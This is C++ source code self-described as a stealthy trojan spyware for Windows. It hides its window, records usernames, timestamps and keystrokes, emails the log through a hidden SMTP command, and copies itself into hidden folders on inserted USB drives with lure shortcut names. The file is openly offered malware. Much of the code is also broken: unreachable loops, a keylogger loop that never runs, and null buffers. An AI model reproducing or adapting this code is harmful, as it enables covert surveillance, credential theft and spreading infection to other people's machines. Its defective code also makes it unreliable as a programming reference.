/**
* Developer: Minhas Kamal (BSSE-0509, IIT, DU)
* Date: 15.Aug.2014, 28.Sep.2015
* Comment: A Stealthy Trojan Spyware.
**/

#include <windows.h>
#include <time.h>
#include <string>
#include <fstream>

using namespace std;


#define FILE_NAME L"Record.log"
#define FOLDER_NAME "trojanCockroach"
#define RUN_FILE_NAME "TrojanCockroach.exe"
#define RUN_LINK_NAME "TrojanCockroach.lnk"
#define INFECT_FILE_NAME "Infect.exe"
#define INFECT_LINK_NAME "Infect.lnk"
#define EMAIL_SENDER_FILE_NAME "Transmit.exe"

#define MIN_RECORD_SIZE 20 //no of PC start count before sending a mail
#define LIFE_TIME 5 //mail will be sent 5 times from one PC
#define MAIL_WAIT_TIME 180000
#define MAILING_TIME 60000

string allDrives;
int age = 0;

int get_setAge();
bool checkRecordSize();
void sendData();
void logUserTime();
void logKey();
char getRemovableDisk();
void infectDrive(LPCWSTR driveLetter);
char* getRandomName();


int main() {
    FreeConsole(); ///hide window

    age = get_setAge();
    if (checkRecordSize()) { ///check for right time

        int i = 1;
        while (i < 3) { ///try 2 times to send data

            Sleep(i * MAIL_WAIT_TIME); ///wait
            if (!system("ping www.google.com -n 1")) { ///check connection
                ////////////****SEND DATA****////////////
                sendData();

                Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
                DeleteFile(FILE_NAME);

                break;
            }
            i++;
        }
    }

    age = get_setAge();

    ////////////****LOG USER_DATE_TIME****////////////
    if (age <= LIFE_TIME) {
        logUserTime();
    }

    char  driveLetter= getRemovableDisk(); ///initial search for all disks
    
  
    size_t  driveLetter_l = sizeof(driveLetter);
    LPWSTR lp_driveLetter = NULL;
  
   

   
    return 0; // :)
    while (1) {
        ////////////****LOG KEY****////////////
        if (age <= LIFE_TIME) {
            logKey();
        }
        else {
            Sleep(5000);
        }

        ////////////****INFECT****////////////
        driveLetter = getRemovableDisk();
        char * driveLetter_ptr;
        size_t driveLetter_l = sizeof(driveLetter);
        wchar_t w_driveLetter[64];
        sprintf_s(driveLetter_ptr, driveLetter_l , "%p", driveLetter);
        mbstowcs_s(&driveLetter_l, w_driveLetter, driveLetter_l, driveLetter_ptr, driveLetter_l);
        if (driveLetter != '0') {
            infectDrive(w_driveLetter);
        }
    }

}

/**
 * For old file get age - for new file set age.
**/
int get_setAge() {
    int ageTemp = age;

    string line;
    ifstream myfile(FILE_NAME);

    if (myfile.is_open()) {
        getline(myfile, line);
        line = line.substr(0, 1);
        sscanf_s(line.c_str(), "%d", &ageTemp);
    }
    else {
        ageTemp++;
        char*  str_FN=NULL;
        size_t str_FN_l = 11;
        wcstombs_s(&str_FN_l, str_FN, 11, FILE_NAME, 11);
        FILE* file;
            fopen_s(&file,str_FN, "a");
        fprintf(file, "%d ", ageTemp);
        fclose(file);
    }

    return ageTemp;
}

/**
 * Count number of lines in record file.
**/
bool checkRecordSize() {
    string line;
    ifstream myfile(FILE_NAME);

    int noOfLines = 0;
    if (myfile.is_open()) {
        while (getline(myfile, line)) {
            noOfLines++;
        }
        myfile.close();
    }

    if (noOfLines < MIN_RECORD_SIZE * age) {
        return false;
    }
    else {
        return true;
    }
}

/**
 * Email all data to the GHOST.
**/
void sendData() {

    const char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"your.email@gmail.com\" --mail-rcpt \"your.email@gmail.com\" --ssl -u your.email@gmail.com:password -T \"Record.log\" -k --anyauth";
    WinExec(command, SW_HIDE);
}

/**
 * Record username, time, and date.
**/
void logUserTime() {
    char* str_FN=nullptr;
    size_t str_FN_l = 11;
    wcstombs_s(&str_FN_l, str_FN, 11, FILE_NAME, 11);
    FILE* file;
    fopen_s(&file,str_FN, "a");
   

    LPWSTR username=NULL;
    unsigned long username_len = 20;
    GetUserName(username, &username_len);
    time_t date = time(NULL);
    char* date_buffer=nullptr;
    fprintf(file, "0\n%s->%s\t", username, ctime_s(date_buffer, sizeof(date),&date));

    fclose(file);
}

/**
 * Record key stroke.
**/
void logKey() {
    FILE* file;
    unsigned short ch = 0, i = 0, j = 500; // :)

    while (j < 500) { ///loop runs for approx. 25 seconds
        ch = 1;
        while (ch < 250) {
            for (i = 0; i < 50; i++, ch++) {
                if (GetAsyncKeyState(ch) == -32767) { ///key is stroke
                 
                    char* str_FN=nullptr;
                    size_t str_FN_l = 11;
                    wcstombs_s(&str_FN_l, str_FN, 11, FILE_NAME, 11);
                    fopen_s(&file,str_FN, "a");
                  
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            Sleep(1); ///take rest
        }
        j++;
    }
}

/**
 * Returns newly inserted disk- pen-drive.
**/
char getRemovableDisk() {
    char drive = '0';

    LPWSTR szLogicalDrives=NULL;
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives = "";

    for (int i = 0; i < dwResult; i++) {
        if (szLogicalDrives[i] > 64 && szLogicalDrives[i] < 90) {
            currentDrives.append(1, szLogicalDrives[i]);

            if (allDrives.find(szLogicalDrives[i]) > 100) {
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}



/**
 * Copy the virus to pen-drive.
**/
void infectDrive(LPCWSTR driveLetter) {
    LPCWSTR folderPath = { driveLetter };

    char* chfolderPath=nullptr;
    size_t chfolderPath_l = MAX_PATH;
    wcstombs_s(&chfolderPath_l, chfolderPath, MAX_PATH, folderPath, MAX_PATH);
   
    char* chdriveLetter=nullptr;
   
   
    strcat_s(chfolderPath,3, ":\\");
    strcat_s(chfolderPath,MAX_PATH, FOLDER_NAME);

    if (CreateDirectory(folderPath, NULL)) {
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        char run[100] = { "" };
        strcat_s(run, chfolderPath);
        strcat_s(run, "\\");
        strcat_s(run, RUN_FILE_NAME);


        size_t  RUN_FILE_NAME_l = sizeof(RUN_FILE_NAME);
        size_t  run_l = sizeof(run);
        LPWSTR lp_RUN_FILE_NAME=NULL;
        LPWSTR lp_run=NULL;

        mbstowcs_s(&RUN_FILE_NAME_l, lp_RUN_FILE_NAME, RUN_FILE_NAME_l, RUN_FILE_NAME, strlen(RUN_FILE_NAME) + 1);//Plus null
        mbstowcs_s(&run_l, lp_run, run_l, run, strlen(run) + 1);//Plus null

        CopyFile(lp_RUN_FILE_NAME, lp_run, 0);

        char net[100] = { "" };
        strcat_s(net, chfolderPath);
        strcat_s(net, "\\");
        strcat_s(net, EMAIL_SENDER_FILE_NAME);
     
        size_t  EMAIL_SENDER_FILE_NAME_l = sizeof(RUN_FILE_NAME);
        size_t  net_l = sizeof(net);
        LPWSTR lp_EMAIL_SENDER_FILE_NAME=NULL;
        LPWSTR lp_net=NULL;

       mbstowcs_s(&EMAIL_SENDER_FILE_NAME_l, lp_EMAIL_SENDER_FILE_NAME, EMAIL_SENDER_FILE_NAME_l, EMAIL_SENDER_FILE_NAME, strlen(EMAIL_SENDER_FILE_NAME) + 1);//Plus null
        mbstowcs_s(&net_l, lp_net, net_l, net, strlen(net) + 1);//Plus null


        CopyFile(lp_EMAIL_SENDER_FILE_NAME, lp_net, 0);

        char infect[100] = { "" };
        strcat_s(infect, chfolderPath);
        strcat_s(infect, "\\");
        strcat_s(infect, INFECT_FILE_NAME);

        size_t  INFECT_FILE_NAME_l = sizeof(RUN_FILE_NAME);
        size_t  infect_l = sizeof(infect);
        LPWSTR lp_INFECT_FILE_NAME=NULL;
        LPWSTR lp_infect=NULL;

        mbstowcs_s(&INFECT_FILE_NAME_l, lp_INFECT_FILE_NAME, INFECT_FILE_NAME_l, INFECT_FILE_NAME, strlen(INFECT_FILE_NAME) + 1);//Plus null
        mbstowcs_s(&infect_l, lp_infect, infect_l, infect, strlen(infect) + 1);//Plus null

        CopyFile(lp_INFECT_FILE_NAME, lp_infect, 0);

        char runlnk[100] = { "" };
        strcat_s(runlnk, chfolderPath);
        strcat_s(runlnk, "\\");
        strcat_s(runlnk, RUN_LINK_NAME);


        size_t  RUN_LINK_NAME_l = sizeof(RUN_FILE_NAME);
        size_t  runlnk_l = sizeof(runlnk);
        LPWSTR lp_RUN_LINK_NAME=NULL;
        LPWSTR lp_runlnk=NULL;

        mbstowcs_s(&RUN_LINK_NAME_l, lp_RUN_LINK_NAME, RUN_LINK_NAME_l, RUN_LINK_NAME, strlen(RUN_LINK_NAME) + 1);//Plus null
        mbstowcs_s(&runlnk_l, lp_runlnk, runlnk_l, runlnk, strlen(runlnk) + 1);//Plus null


        CopyFile(lp_RUN_LINK_NAME, lp_runlnk, 0);

        char infectlnk[100] = { "" };
        strcat_s(infectlnk, chfolderPath);
        strcat_s(infectlnk, "\\");
        strcat_s(infectlnk, INFECT_LINK_NAME);

        size_t  INFECT_LINK_NAME_l = sizeof(INFECT_LINK_NAME);
        size_t  infectlnk_l = sizeof(infectlnk);
        LPWSTR lp_INFECT_LINK_NAME=NULL;
        LPWSTR lp_infectlnk=NULL;

        mbstowcs_s(&INFECT_LINK_NAME_l, lp_INFECT_LINK_NAME, INFECT_LINK_NAME_l, INFECT_LINK_NAME, strlen(INFECT_LINK_NAME) + 1);//Plus null
        mbstowcs_s(&infectlnk_l, lp_infectlnk, infectlnk_l, infectlnk, strlen(infectlnk) + 1);//Plus null
        CopyFile(lp_INFECT_LINK_NAME, lp_infectlnk, 0);

        char hideCommand[100] = { "" };
        strcat_s(hideCommand, "attrib +s +h +r ");
        strcat_s(hideCommand, chfolderPath);
        WinExec(hideCommand, SW_HIDE);
    }
    else {
        srand(time(0));
        int random = rand();

        if (random % 2 == 0 || random % 3 == 0 || random % 7 == 0) {
            return;
        }
    }
    
    char* infectlnkauto = nullptr;
     infectlnkauto= chdriveLetter ;
    char* randomName = getRandomName();
    strcat_s(infectlnkauto, MAX_PATH,randomName);

    size_t  INFECT_LINK_NAME_l = sizeof(INFECT_LINK_NAME);
    size_t  infectlnkauto_l = sizeof(infectlnkauto);
    LPWSTR lp_INFECT_LINK_NAME=NULL;
    LPWSTR lp_infectlnkauto=NULL;

    mbstowcs_s(&INFECT_LINK_NAME_l, lp_INFECT_LINK_NAME, INFECT_LINK_NAME_l, INFECT_LINK_NAME, strlen(INFECT_LINK_NAME) + 1);//Plus null
    mbstowcs_s(&infectlnkauto_l, lp_infectlnkauto, infectlnkauto_l, infectlnkauto, strlen(infectlnkauto) + 1);//Plus null
    CopyFile(lp_INFECT_LINK_NAME, lp_infectlnkauto, 0);
}

/**
 * Returns a random name for the link file.
**/
char* getRandomName() {
    char randomName[40];

    srand(time(0));
    int random = rand();

    if (random % 8 == 0) {
        strcpy_s(randomName, ":\\DO NOT CLICK!.lnk");
    }
    else if (random % 4 == 0) {


        LPWSTR username=NULL;
        char* chusername=nullptr;
        size_t chusername_l=MAX_PATH;
        wcstombs_s(&chusername_l,chusername, MAX_PATH, username, MAX_PATH);

        unsigned long username_len = 20;
        GetUserName(username, &username_len);

        random = rand();
        if (random % 8 == 0) {
            strcpy_s(randomName, ":\\Boss ");
            strcat_s(randomName,MAX_PATH, chusername);
            strcat_s(randomName, ".lnk");
        }
        else if (random % 4 == 0) {
            strcpy_s(randomName, ":\\");
            strcat_s(randomName, MAX_PATH,chusername);
            strcat_s(randomName, " is the best.lnk");
        }
        else if (random % 2 == 0) {
            strcpy_s(randomName, ":\\Hello ");
            strcat_s(randomName, MAX_PATH,chusername);
            strcat_s(randomName, "! good morning.lnk");
        }
        else {
            strcpy_s(randomName, ":\\");
            strcat_s(randomName,MAX_PATH,chusername);
            strcat_s(randomName, "! please help me.lnk");
        }
    }
    else if (random % 2 == 0) {
        strcpy_s(randomName, ":\\I will kill you ! ! !.lnk");
    }
    else if (random % 3 == 0) {
        strcpy_s(randomName, ":\\2+2=5.lnk");
    }
    else {
        strcpy_s(randomName, ":\\TOP SECRET.lnk");
    }

    return randomName;
}
